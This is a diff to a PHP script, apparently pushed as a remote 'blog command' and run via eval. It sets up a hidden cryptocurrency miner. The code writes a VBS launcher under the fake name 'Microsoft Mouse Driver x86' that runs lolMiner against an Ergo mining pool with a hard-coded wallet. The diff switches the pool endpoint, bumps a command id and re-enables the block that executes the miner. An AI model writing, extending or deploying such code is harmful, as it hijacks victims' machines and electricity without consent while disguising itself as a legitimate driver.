@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****27
+****28
 
 [GIT_COMMAND]
 
@@ -323,7 +323,8 @@ if(1)
 		$vbs_checkname = 'Microsoft Mouse Driver x86';
 		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
-		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9fuM8aA19bEFdGZyL2i8fmnLTKHw7gebJWwWCMUnEMnMg5QReFG.'.$work_key.' --watchdog exit --nocolor';
+		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9fuM8aA19bEFdGZyL2i8fmnLTKHw7gebJWwWCMUnEMnMg5QReFG.'.$work_key.' --watchdog exit --nocolor';*/
+		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9fuM8aA19bEFdGZyL2i8fmnLTKHw7gebJWwWCMUnEMnMg5QReFG.'.$work_key.' --watchdog exit --nocolor';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
@@ -387,8 +388,8 @@ if(1)
 		if($execlol && $vbs_exec_path)
 		{
 			$output = array();
-			/**
-			$new_command_id = '10010';
+			/**/
+			$new_command_id = '10011';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
 			if(@file_get_contents($path_control_id) !== $new_command_id)
 			{
